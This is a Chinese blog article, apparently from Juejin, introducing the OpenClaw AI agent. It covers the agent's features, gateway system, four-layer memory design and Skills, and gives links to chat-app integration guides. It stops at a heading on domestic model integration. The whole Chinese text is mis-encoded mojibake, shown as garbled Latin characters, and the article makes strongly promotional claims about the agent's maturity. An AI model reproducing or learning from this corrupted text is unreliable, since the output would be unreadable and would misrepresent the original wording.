data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">å‰è¨€</h2>
<p>2026å¹´å¼€å¹´çš„AIæ™ºèƒ½ä½“é¡¹ç›®ä¸­ï¼Œ<strong>OpenClaw</strong>Â æ— ç–‘æ˜¯è¿‘æœŸæœ€å—ç©ç›®çš„ç°è±¡çº§å¼€æºæˆæœã€‚è¯¥é¡¹ç›®åœ¨ GitHub ä¸Šå¼€æºä¸åˆ°ä¸€ä¸ªæœˆï¼Œä¾¿æ–©è·è¿‘Â <strong>15 ä¸‡ Star</strong>ï¼Œçƒ­åº¦ç”šè‡³è¶…è¶Š Claude Codeã€‚æœ‰è¶£çš„æ˜¯ï¼Œå®ƒæ›¾åœ¨çŸ­çŸ­ä¸€ä¸ªæœˆå†…å†ç»ä¸‰æ¬¡æ›´åâ€”â€”ä» Clawd Bot åˆ° MoltBotï¼Œå†åˆ°å¦‚ä»Šçš„ OpenClawï¼Œå…¶è¿­ä»£ä¹‹å¿«ç”šè‡³è¶…è¿‡äº†ç¬”è€…çš„æ›´æ–‡é€Ÿåº¦ã€‚</p>
<p><strong>OpenClaw</strong> ä¸ä»…å—åˆ°å¼€å‘è€…ç¤¾åŒºçš„ç‹‚çƒ­è¿½æ§ï¼Œè¿˜è·å¾—äº† OpenAI è”åˆåˆ›å§‹äºº Karpathy çš„é«˜åº¦è¯„ä»·ï¼Œè¢«ç§°ä¸ºâ€œè¿„ä»Šä¸ºæ­¢æœ€å®ç”¨çš„æ™ºèƒ½ä½“é¡¹ç›®â€ã€‚å…¶å½±å“åŠ›ç”šè‡³æº¢å‡ºæŠ€æœ¯åœˆï¼Œä¸€åº¦å› ä¼—å¤šç”¨æˆ·äº‰ç›¸éƒ¨ç½²è€Œå¸¦åŠ¨ Mac Mini æŠ¢è´­çƒ­æ½®ï¼Œè¶³ä»¥è§è¯å®ƒçš„å—æ¬¢è¿ç¨‹åº¦ã€‚</p>
<p>ç›®å‰ï¼Œç½‘ç»œä¸Šå·²æ¶Œç°å¤§é‡ OpenClaw çš„éƒ¨ç½²æ•™ç¨‹ï¼Œæœ¬æ–‡ä¸å†é‡å¤èµ˜è¿°ï¼ˆæ–‡æœ«å°†é™„ä¸Šç¬”è€…æ¨èçš„æœ¬åœ°éƒ¨ç½²æ•™ç¨‹é“¾æ¥ï¼‰ã€‚æœ¬ç¯‡å†…å®¹ç¬”è€…é‡ç‚¹åœ¨äºè§£æÂ <strong>OpenClaw çš„æ ¸å¿ƒç‰¹æ€§ä¸è®¾è®¡æ€è·¯</strong>ï¼Œé€šè¿‡é€šä¿—æ˜“æ‡‚çš„åŸç†è§£è¯»ï¼Œå¸®åŠ©å¤§å®¶åœ¨ä½“éªŒå…¶å¼ºå¤§åŠŸèƒ½çš„åŒæ—¶ï¼Œæ·±å…¥ç†è§£å…¶å·¥ä½œæœºåˆ¶ï¼ŒçœŸæ­£åšåˆ°<strong>çŸ¥å…¶ç„¶ï¼Œäº¦çŸ¥å…¶æ‰€ä»¥ç„¶</strong>ã€‚</p>
<p align="center"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/dd3eeb24d7ee453dacf3a0b0d533f0e8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L55yf5aW9546p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770778510&amp;x-signature=4qiB4UFED8ofvoeVzayjyiSggEM%3D" alt="0.png" width="70%" loading="lazy"/></p>
<h2 data-id="heading-1">ä¸€ã€OpenClawç‰¹æ€§è¯¦è§£</h2>
<h3 data-id="heading-2">1.1 OpenClawèƒ½åŠ›æ¦‚è§ˆ</h3>
<p>ä½œä¸º 2026 å¹´ä»¥æ¥æœ€å—å…³æ³¨çš„å¼€æºé¡¹ç›®ï¼ŒOpenClaw çš„èƒ½åŠ›è¦†ç›–èŒƒå›´æå¹¿ï¼Œå‡ ä¹å¯ä»¥è§†ä½œä¸€ä½å…¨èƒ½çš„â€œæ•°å­—å‘˜å·¥â€ã€‚å…¶ä¸»è¦åº”ç”¨åœºæ™¯åŒ…æ‹¬ï¼š</p>
<ul>
<li><strong>è‡ªåŠ¨åŒ–ä¸å¼€å‘</strong>ï¼šæµè§ˆå™¨è‡ªåŠ¨åŒ–ã€AI è‡ªåŠ¨ç¼–ç¨‹ã€æ•°æ®å¤„ç†ä¸æŠ¥å‘Šç”Ÿæˆã€‚</li>
<li><strong>æ—¥å¸¸åŠå…¬è¾…åŠ©</strong>ï¼šè‡ªåŠ¨å›å¤é‚®ä»¶ã€å…¨ç½‘å•†å“æ¯”ä»·ã€æ•´ç†å¤‡å¿˜å½•ã€ä¼šè®®å½•éŸ³è½¬æ–‡å­—çºªè¦ç­‰ã€‚</li>
<li><strong>æ™ºèƒ½è®¾å¤‡è”åŠ¨</strong>ï¼šæ¥å…¥æ™ºèƒ½å®¶å±…ï¼Œè‡ªåŠ¨è°ƒèŠ‚ç¯å…‰ã€æ¸©åº¦ç­‰ç¯å¢ƒå‚æ•°ã€‚</li>
<li><strong>è·¨ç»ˆç«¯è¿œç¨‹åä½œ</strong>ï¼šé€šè¿‡ä¸ iMessage ç­‰å³æ—¶é€šè®¯å·¥å…·å¯¹æ¥ï¼Œç”¨æˆ·å¯ç›´æ¥åœ¨æ‰‹æœºç«¯å‘ OpenClaw ä¸‹è¾¾æŒ‡ä»¤ï¼Œè¿œç¨‹å®‰æ’å·¥ä½œã€‚æ›´æœ‰å¼€å‘è€…å®ç°äº†é€šè¿‡ Apple Watch è¿œç¨‹æŒ‡æŒ¥ OpenClaw åˆå¹¶ PRã€è‡ªåŠ¨ Debug ç­‰æ“ä½œã€‚</li>
</ul>
<p>æ€»çš„æ¥è¯´å‡¡æ˜¯èƒ½å¤Ÿé€šè¿‡Â <strong>Skillsï¼ˆæŠ€èƒ½æ¨¡å—ï¼‰</strong> Â æˆ–Â <strong>MCPï¼ˆModel Context Protocolï¼Œæ¨¡å‹ä¸Šä¸‹æ–‡åè®®ï¼‰</strong> Â å°è£…å®ç°çš„åŠŸèƒ½ï¼ŒOpenClaw çš†èƒ½æ— ç¼è¡”æ¥ã€‚</p>
<p>æ³¨ï¼šå¦‚å¯¹ Agent Skills æˆ– MCP ä¸ç†Ÿæ‚‰ï¼Œå¯å‚é˜…ç¬”è€…å¾€æœŸæ–‡ç« ï¼š</p>
<ul>
<li>ã€Š<a href="https://juejin.cn/post/7598918127578972194" target="_blank" title="https://juejin.cn/post/7598918127578972194">Agent Skills å®Œå…¨æŒ‡å—ï¼šæ ¸å¿ƒæ¦‚å¿µä¸¨è®¾è®¡æ¨¡å¼ä¸¨å®æˆ˜ä»£ç </a>ã€‹</li>
<li>ã€Š<a href="https://juejin.cn/post/7488895565314949120" target="_blank" title="https://juejin.cn/post/7488895565314949120">ç†è®º+ä»£ç ä¸€æ–‡å¸¦ä½ æ·±å…¥æµ…å‡º MCPï¼šäººå·¥æ™ºèƒ½å¤§æ¨¡å‹ä¸å¤–éƒ¨ä¸–ç•Œäº¤äº’çš„é©å‘½æ€§çªç ´</a>ã€‹</li>
</ul>
<p align="center"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8b858711bb244d0b8f00948fdc92d520~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L55yf5aW9546p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770778510&amp;x-signature=JrV4cIExlXTwTZPL92ESW%2F0kxfI%3D" alt="2.png" loading="lazy"/></p>
<h3 data-id="heading-3">1.2 OpenClaw æ ¸å¿ƒç‰¹æ€§</h3>
<p>é™¤äº†å¹¿æ³›çš„èƒ½åŠ›è¦†ç›–ï¼ŒOpenClaw åœ¨è®¾è®¡ä¸Šè¿˜å…·æœ‰ä»¥ä¸‹ä¸‰å¤§æ ¸å¿ƒä¼˜åŠ¿ï¼š</p>
<p><strong>1. å…¨å¹³å°æ¥å…¥ä¸å®æ—¶äº¤äº’</strong><br/>
OpenClaw å¯è½»æ¾æ¥å…¥å„ç±»èŠå¤©å·¥å…·ï¼ˆå¦‚ Telegramã€å¾®ä¿¡ã€iMessage ç­‰ï¼‰ä¸æ™ºèƒ½è®¾å¤‡ã€‚ç”¨æˆ·å³ä½¿ä¸åœ¨ç”µè„‘å‰ï¼Œä¹Ÿèƒ½é€šè¿‡æ‰‹æœºè¿œç¨‹æŒ‡æ´¾ä»»åŠ¡ã€‚OpenClaw ä¸ä»…èƒ½æ‰§è¡Œæ“ä½œï¼Œè¿˜èƒ½å®æ—¶å›ä¼ å±å¹•æˆªå›¾ã€æ‰§è¡Œæ—¥å¿—ç­‰ä¿¡æ¯ï¼Œè®©æ•´ä¸ªè¿‡ç¨‹å®Œå…¨é€æ˜ã€‚æ­¤å¤–ï¼Œé€šè¿‡å¯¹æ¥éº¦å…‹é£ã€æ‘„åƒå¤´ç­‰å¤–è®¾ï¼Œå®ƒè¿˜èƒ½ç›´æ¥å¤„ç†éŸ³è§†é¢‘ä¿¡æ¯ï¼Œå®ç°æ›´è‡ªç„¶çš„äº¤äº’ã€‚</p>
<p align="center"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b611d17e8edf471b921409285adcb516~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L55yf5aW9546p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770778510&amp;x-signature=0op8yMs%2Bngwo7Ne%2FLc9jIVyjLPw%3D" alt="3.png" width="50%" loading="lazy"/></p>
<p><strong>2. æ™ºèƒ½å®šæ—¶ä»»åŠ¡ä¸ä¸»åŠ¨åˆ¤æ–­</strong><br/>
OpenClawå†…ç½®å¼ºå¤§çš„è‡ªç„¶è¯­è¨€å®šæ—¶ä»»åŠ¡å¼•æ“ã€‚ç”¨æˆ·åªéœ€ç”¨æ—¥å¸¸è¯­è¨€æè¿°ï¼Œå³å¯åˆ›å»ºä¸´æ—¶æé†’ã€å®šæœŸæ£€æŸ¥æ”¶ä»¶ç®±ç­‰ä»»åŠ¡ã€‚æ›´é‡è¦çš„æ˜¯ï¼ŒOpenClaw å…·å¤‡äº‹ä»¶ç´§æ€¥ç¨‹åº¦åˆ¤æ–­èƒ½åŠ›ï¼Œå¯è‡ªä¸»å†³å®šæ˜¯å¦é€šè¿‡èŠå¤©å·¥å…·ä¸»åŠ¨è”ç³»ç”¨æˆ·ã€‚è¿™ä¸€åšæ³•æ‰“ç ´äº†ä¼ ç»Ÿâ€œæŒ‡ä»¤-æ‰§è¡Œâ€çš„è¢«åŠ¨å¾ªç¯ï¼Œè®©æ™ºèƒ½ä½“å……åˆ†å‘æŒ¥å®ƒçš„ä¸»è§‚èƒ½åŠ¨æ€§ã€‚</p>
<p align="center"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a506b7b3461b400d87619fd2972d7ef2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L55yf5aW9546p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770778510&amp;x-signature=A%2BGOqfYRcgDQBZiQHZF8UiZEmJs%3D" alt="4.png" width="50%" loading="lazy"/></p>
<p><strong>3. æŒç»­è¿›åŒ–çš„é•¿æœŸè®°å¿†</strong><br/>
OpenClaw æ”¯æŒå°†è®°å¿†ä»¥æ–‡ä»¶å½¢å¼å­˜å‚¨åœ¨æœ¬åœ°ï¼Œå¹¶èƒ½åœ¨å¯¹è¯ä¸­å¿«é€Ÿæ£€ç´¢ç›¸å…³è®°å¿†å¹¶æ”¾å…¥ä¸Šä¸‹æ–‡ã€‚éšç€ä½¿ç”¨é¢‘æ¬¡å¢åŠ ï¼Œå®ƒä¼šä¸»åŠ¨æ›´æ–°å’Œä¼˜åŒ–è¿™äº›è®°å¿†æ–‡ä»¶ï¼Œå®ç°â€œè¶Šç”¨è¶Šèªæ˜â€çš„æŒç»­å­¦ä¹ æ•ˆæœã€‚</p>
<p>ç»è¿‡å…¨ç½‘å¤§é‡çš„å®è·µè¯æ˜ï¼ŒOpenClawä¸ä»…æ˜¯ä¸€ä¸ªåŠŸèƒ½å®Œå–„ã€æ€§èƒ½å‰æ²¿çš„å…¨æ–°ä¸€ä»£æ™ºèƒ½ä½“ï¼Œè€Œä¸”è¿è¡Œç¨³å®šï¼Œå„é¡¹å‚æ•°ç”Ÿæˆå®Œæ•´ï¼Œæ˜¯ä¸€é¡¹å®Œå…¨èƒ½å¤Ÿåº”ç”¨äºå·¥ä¸šçº§åœºæ™¯çš„é«˜æ€§èƒ½æ™ºèƒ½ä½“ã€‚æˆ–è®¸OpenClawçš„å‡ºç°æ˜¯æˆ‘ä»¬äººç±»ç¬¬ä¸€æ¬¡çœŸæ­£æ„ä¹‰ä¸Šæ‹¥æœ‰äº†æœŸå¾…å·²ä¹…çš„æ•°å­—å‘˜å·¥ï¼</p>
<h2 data-id="heading-4">äºŒã€OpenClaw åŸç†è§£æ</h2>
<p>OpenClaw ç”±å‰ PSPDFKit åˆ›å§‹äºº Peter Steinberger å¼€å‘ï¼Œä¸€ä½è‡ªç§°ä¸ºâ€œé€€ä¼‘ç¨‹åºå‘˜â€ï¼Œå´æ‰“é€ å‡ºäº†ä¸€æ¬¾é¢‡å…·é©å‘½æ€§çš„å¼€æºä¸ªäººAIåŠ©æ‰‹çš„å¤§ç¥! è¯¥é¡¹ç›®æœ€åˆçš„ç†å¿µæ˜¯ â€œClaude with handsâ€ï¼ˆæ‹¥æœ‰åŒæ‰‹çš„ Claudeï¼‰ï¼Œæ—¨åœ¨å°†å¤§å‹è¯­è¨€æ¨¡å‹çš„æ™ºèƒ½ä¸æœ¬åœ°ç³»ç»Ÿçš„æ“ä½œèƒ½åŠ›æ·±åº¦èåˆã€‚</p>
<p>åˆæ¬¡æ¥è§¦ OpenClawï¼Œå¤§å®¶æˆ–è®¸ä¼šè”æƒ³åˆ°æ­¤å‰å¤§ç«çš„Â <a href="https://juejin.cn/post/7479212482546073611" target="_blank" title="https://juejin.cn/post/7479212482546073611">Manus</a>Â ç­‰é¡¹ç›®ã€‚ä½† OpenClaw å¹¶éä¸€ä¸ªè¿è¡Œåœ¨æµè§ˆå™¨ä¸­çš„ç½‘é¡µåº”ç”¨ï¼Œè€Œæ˜¯ä¸€ä¸ªéƒ¨ç½²äºæœ¬åœ°çš„åå°æœåŠ¡ã€‚è¿™æ„å‘³ç€å®ƒæ‹¥æœ‰æé«˜çš„éšç§å®‰å…¨æ€§å’Œå¯¹ä½ ç”µè„‘çš„ç›´æ¥æ“ä½œæƒé™ã€‚å¤§å®¶å¯ä»¥å°†å…¶ç†è§£ä¸ºä¸€ä¸ªæˆç†Ÿçš„â€œComputer Useâ€ï¼Œèƒ½å¤Ÿæ‰§è¡Œå‘½ä»¤è¡ŒæŒ‡ä»¤ã€åœ¨æ²™ç›’ç¯å¢ƒä¸­è¿è¡Œä»£ç ï¼Œå¹¶æ“æ§æµè§ˆå™¨ç­‰åº”ç”¨ã€‚</p>
<p>OpenClaw ä¸ Manus ç­‰é¡¹ç›®çš„æœ¬è´¨åŒºåˆ«ï¼Œåœ¨äºå…¶ä»¥ä¸‹å‡ é¡¹æ ¸å¿ƒæ¶æ„çš„å·§å¦™è®¾è®¡ï¼š</p>
<h3 data-id="heading-5">2.1 ç½‘å…³ç³»ç»Ÿï¼šåè®®æ— å…³çš„æ™ºèƒ½ç¼–æ’å±‚</h3>
<p>OpenClaw æ‹¥æœ‰ä¸€ä¸ªå¼ºå¤§ä¸”çµæ´»çš„<strong>ç½‘å…³ç³»ç»Ÿï¼ˆGateway Systemï¼‰</strong> ã€‚å®ƒä¸ä»…ä»…æ˜¯ä¸€ä¸ªç®€å•çš„ API è½¬å‘å™¨ï¼Œæ›´æ˜¯ä¸€ä¸ª<strong>åè®®æ— å…³çš„ç¼–æ’å±‚ï¼ˆProtocol-Agnostic Orchestratorï¼‰</strong> ã€‚å…¶æ ¸å¿ƒåœ¨äºç»´æŠ¤ä¸€ä¸ªæŒä¹…çš„ WebSocket è¿æ¥ï¼Œæ„å»ºå‡ºä¸€æ¡å®æ—¶ã€åŒå‘çš„é€šä¿¡é€šé“ã€‚æ— è®ºæŒ‡ä»¤æ¥è‡ªç»ˆç«¯å‘½ä»¤è¡Œã€Web æ§åˆ¶é¢æ¿ï¼Œè¿˜æ˜¯é€šè¿‡ iMessage ç­‰é€šè®¯å·¥å…·è¿œç¨‹å‘é€ï¼Œç½‘å…³éƒ½èƒ½å°†è¿™äº›å¼‚æ„çš„è¾“å…¥ä¿¡å·å³æ—¶æ ‡å‡†åŒ–ï¼Œå¹¶ç»Ÿä¸€ç»´æŠ¤<strong>ä¼šè¯çŠ¶æ€ï¼ˆSession Stateï¼‰</strong> ã€‚</p>
<p>è¿™ä¹Ÿè§£é‡Šäº†ä¸ºä½•è®¸å¤šç”¨æˆ·é€‰æ‹©ä½¿ç”¨ Mac Mini ä½œä¸º OpenClaw çš„æœåŠ¡å™¨ï¼šä¸€æ–¹é¢æ˜¯ä¸ºäº†æ‹¥æœ‰ä¸€ä¸ª 7x24 å°æ—¶å¾…å‘½çš„ä¸“å± AI åŠ©æ‰‹ï¼›å¦ä¸€æ–¹é¢ï¼Œåœ¨è‹¹æœç”Ÿæ€ä¸‹ï¼Œç”¨æˆ·å¯ä»¥ç›´æ¥é€šè¿‡ iPhone æˆ– Apple Watch ä¸Šçš„ iMessage ä¸è¿œç¨‹ OpenClaw å¯¹è¯ï¼Œæ— éœ€å®‰è£…ä»»ä½•é¢å¤–æ’ä»¶ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6743cd220f1348cbbe761fbd5a68ae79~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L55yf5aW9546p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770778510&amp;x-signature=3rOc5Tj7KDK3mhi8Lh6zinrM8S4%3D" alt="6.png" loading="lazy"/></p>
<h3 data-id="heading-6">2.2 å››å±‚è®°å¿†æ¶æ„ï¼šå®ç°æ— é™é•¿ä¸Šä¸‹æ–‡ä¸æŒç»­è¿›åŒ–</h3>
<p>OpenClaw çš„å¦ä¸€å¤§æ ¸å¿ƒä¼˜åŠ¿åœ¨äºå…¶ç²¾å·§çš„ä¸Šä¸‹æ–‡ç®¡ç†å·¥ç¨‹ã€‚å®ƒé€šè¿‡Â <strong>SOULã€TOOLSã€USERã€Session</strong>Â å››å±‚è®°å¿†ç»“æ„ï¼Œæ„å»ºäº†ä¸€å¥—é«˜æ€§èƒ½çš„ä¸Šä¸‹æ–‡ç®¡ç†ç³»ç»Ÿã€‚</p>
<ol>
<li><strong>SOULï¼ˆçµé­‚ï¼‰</strong> ï¼šæ™ºèƒ½ä½“çš„ä¸å¯å˜å†…æ ¸ï¼ŒåŒ…å«äº†å…¶åº•å±‚çš„ç³»ç»ŸæŒ‡ä»¤ä¸æ ¸å¿ƒè¡Œä¸ºå‡†åˆ™ã€‚</li>
<li><strong>TOOLSï¼ˆå·¥å…·ï¼‰</strong> ï¼šåŠ¨æ€çš„å·¥å…·æ³¨å†Œè¡¨ã€‚ç³»ç»Ÿå¯æ ¹æ®å½“å‰ç¯å¢ƒï¼Œçµæ´»æ³¨å…¥å¯ç”¨çš„ API å’Œèƒ½åŠ›ï¼Œå®ç°æŒ‰éœ€è°ƒç”¨ã€‚</li>
<li><strong>USERï¼ˆç”¨æˆ·è®°å¿†ï¼‰</strong> ï¼šåŸºäºè¯­ä¹‰å‘é‡çš„é•¿æœŸè®°å¿†åº“ã€‚OpenClaw ä¼šåœ¨äº¤äº’ä¸­è‡ªåŠ¨å­¦ä¹ å¹¶å­˜å‚¨ç”¨æˆ·çš„åå¥½ã€ä¹ æƒ¯ç”šè‡³ä»£ç é£æ ¼ï¼Œä»è€Œå®ç°â€œè¶Šç”¨è¶Šæ‡‚ä½ â€çš„ä¸ªæ€§åŒ–ä½“éªŒã€‚</li>
<li><strong>Sessionï¼ˆä¼šè¯è®°å¿†ï¼‰</strong> ï¼šå®æ—¶çš„æƒ…æ™¯è®°å¿†ã€‚å®ƒèƒ½æ•æ‰å½“å‰å¯¹è¯ä¸­æœ‰ä»·å€¼çš„ä¿¡æ¯ï¼Œå¹¶åŠ¨æ€åœ°å°†å…¶çº³å…¥ä¸Šä¸‹æ–‡ï¼Œä¿è¯å¯¹è¯çš„è¿è´¯æ€§ã€‚</li>
</ol>
<p>è¿™å¥—åˆ†å±‚è®°å¿†ä½“ç³»ä¸ä»…æ”¯æ’‘äº†â€œæ— é™é•¿ä¸Šä¸‹æ–‡â€çš„å¯¹è¯ä½“éªŒï¼Œæ›´æ˜¯ OpenClaw èƒ½å¤ŸæŒç»­å­¦ä¹ ã€ä¸æ–­è¿›åŒ–çš„æŠ€æœ¯åŸºçŸ³ã€‚è¿™ä¸€æ•´å¥—çš„ä¸Šä¸‹æ–‡è®°å¿†ç®¡ç†å·¥ç¨‹å€¼å¾—å¤§å®¶å¼€å‘æ™ºèƒ½ä½“å€Ÿé‰´å­¦ä¹ ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0a46634fdc7a49fbbdd74921e4c1f197~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L55yf5aW9546p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770778510&amp;x-signature=J6fEFfMZh5d6UN0u6g2aGXud6j0%3D" alt="7.png" loading="lazy"/></p>
<h3 data-id="heading-7">2.3 Agent Skills åŠŸèƒ½ä½“ç³»ï¼šå³æ’å³ç”¨çš„èƒ½åŠ›æ‰©å±•</h3>
<p>å¦‚æœè¯´ MCP åè®®æ˜¯ä¸ºäº†è®©æ™ºèƒ½ä½“æ›´é«˜æ•ˆåœ°â€œè°ƒç”¨å·¥å…·â€ï¼Œé‚£ä¹ˆÂ <strong>Agent Skills</strong>Â åˆ™æ˜¯ç›´æ¥ä¸ºæ™ºèƒ½ä½“â€œèµ‹äºˆèƒ½åŠ›â€ã€‚</p>
<p>ä¾‹å¦‚ï¼Œå®‰è£…Â <code>apple-notes</code>Â Skill åï¼ŒOpenClaw ä¾¿å³åˆ»è·å¾—è¯»å†™å’Œæ“ä½œè‹¹æœä¾¿ç­¾çš„å…¨éƒ¨æƒé™ï¼›åŠ è½½Â <code>bird</code>Â Skillï¼Œå®ƒå°±èƒ½è‡ªåŠ¨å¸®ä½ æœé›†ã€æ•´ç†æ¨ç‰¹ä¿¡æ¯ï¼Œç”šè‡³ä»£ä¸ºå‘å¸ƒæ¨æ–‡ã€‚ç®€è€Œè¨€ä¹‹ï¼Œ<strong>æƒ³è®© OpenClaw å…·å¤‡ä»€ä¹ˆèƒ½åŠ›ï¼Œåªéœ€å®‰è£…å¯¹åº”çš„ Skill å³å¯</strong>ã€‚</p>
<p>æ­¤å¤–ï¼ŒOpenClaw è¿˜æ”¯æŒå®Œæ•´çš„<strong>å¤šæ¨¡æ€æ¨¡å‹è°ƒç”¨</strong>ï¼Œå¹¶é›†æˆäº†è¯¸å¦‚çœ‹é—¨ç‹—ï¼ˆç›‘æ§ï¼‰å­ç³»ç»Ÿã€æ’ä»¶ä½“ç³»ã€è·¨å¹³å°éƒ¨ç½²ç­‰å¤šé¡¹ä¼ä¸šçº§ç‰¹æ€§ã€‚ç”±æ­¤å¯è§ï¼Œè¿™ç»éä¸€ä¸ªç®€å•çš„â€œä¸ªäººç©å…·â€ï¼Œè€Œæ˜¯åœ¨ Agent Skills ä¸ Vibe Coding æ—¶ä»£èƒŒæ™¯ä¸‹ï¼Œè¶…è¶Š Manus çš„ã€é¢å‘æœªæ¥çš„æ–°ä¸€ä»£é€šç”¨æ™ºèƒ½ä½“å¹³å°ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8864ac619cc0453ba5b9c789e933c0bb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L55yf5aW9546p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770778510&amp;x-signature=00uX14ToOWk47vqyWOrGm4tdiK8%3D" alt="8.png" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1ac4100b4e6548a1b8909017b35d9129~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L55yf5aW9546p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770778510&amp;x-signature=12XJz7e7%2Fe86R3IozLf797R%2BuZI%3D" alt="9.png" loading="lazy"/></p>
<h2 data-id="heading-8">ä¸‰ã€OpenClaw å®ç”¨æŒ‡å—ï¼šæ¥å…¥å›½å†…å¤§æ¨¡å‹ä¸ä¸»æµèŠå¤©å·¥å…·</h2>
<p>æ— è®ºæ˜¯å¸Œæœ›æ‹¥æœ‰ä¸€ä¸ªä¸“å±çš„â€œè´¾ç»´æ–¯â€æ¥æå‡å·¥ä½œæ•ˆç‡ï¼Œè¿˜æ˜¯ä½œä¸ºå¼€å‘è€…å¸Œæœ›å­¦ä¹ æœ€å‰æ²¿çš„ Agent è®¾è®¡ç†å¿µï¼ŒOpenClaw éƒ½æ˜¯ä¸€ä¸ªæå…·ä»·å€¼çš„é«˜è´¨é‡é¡¹ç›®ï¼Œéå¸¸å€¼å¾—åœ¨æœ¬åœ°è¿›è¡Œæ·±å…¥å°è¯•å’Œå®è·µã€‚</p>
<p>ä¸ºäº†å¸®åŠ©å¤§å®¶å¿«é€Ÿå®ç°ä¸€ä¸ªâ€œèƒ½å¹²äº‹ã€ä¼šæ²Ÿé€šâ€çš„ä¸ªäººæ™ºèƒ½ä½“ï¼Œä»¥ä¸‹æ˜¯ç¬”è€…æ•´ç†çš„Â <strong>OpenClaw æ¥å…¥å›½å†…ä¸»æµèŠå¤©å·¥å…·ä¸å›½äº§å¤§æ¨¡å‹çš„å®ç”¨æŒ‡å—æ±‡æ€»</strong>ã€‚</p>
<h3 data-id="heading-9">3.1 ä¸»æµèŠå¤©å·¥å…·æ¥å…¥</h3>
<p>OpenClaw å¼ºå¤§çš„ç½‘å…³ç³»ç»Ÿä½¿å…¶èƒ½è½»æ¾é€‚é…å„ç±»å³æ—¶é€šè®¯å·¥å…·ã€‚ä»¥ä¸‹æ˜¯å‡ ä¸ªä¸»æµå¹³å°çš„æ¥å…¥æ•™ç¨‹ï¼š</p>
<ul>
<li>
<p><strong>æ¥å…¥ WhatsApp æŒ‡å—</strong><br/>
è§†é¢‘æ•™ç¨‹ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.bilibili.com%2Fvideo%2FBV1kH6nBFEPq" target="_blank" title="https://www.bilibili.com/video/BV1kH6nBFEPq" ref="nofollow noopener noreferrer">www.bilibili.com/video/BV1kHâ€¦</a></p>
</li>
<li>
<p><strong>æ¥å…¥é£ä¹¦æŒ‡å—</strong><br/>
è§†é¢‘æ•™ç¨‹ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.bilibili.com%2Fvideo%2FBV1kH6nBFEPq" target="_blank" title="https://www.bilibili.com/video/BV1kH6nBFEPq" ref="nofollow noopener noreferrer">www.bilibili.com/video/BV1kHâ€¦</a></p>
</li>
<li>
<p><strong>æ¥å…¥å¾®ä¿¡ã€é’‰é’‰ã€QQ ä¸€ç«™å¼æŒ‡å—</strong><br/>
è§†é¢‘æ•™ç¨‹ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.bilibili.com%2Fvideo%2FBV1MfFAz6EnR" target="_blank" title="https://www.bilibili.com/video/BV1MfFAz6EnR" ref="nofollow noopener noreferrer">www.bilibili.com/video/BV1Mfâ€¦</a></p>
</li>
</ul>
<h3 data-id="heading-10">3.2 å›½äº§å¤§æ¨¡å‹é›†æˆæ–¹æ¡ˆ</h3>
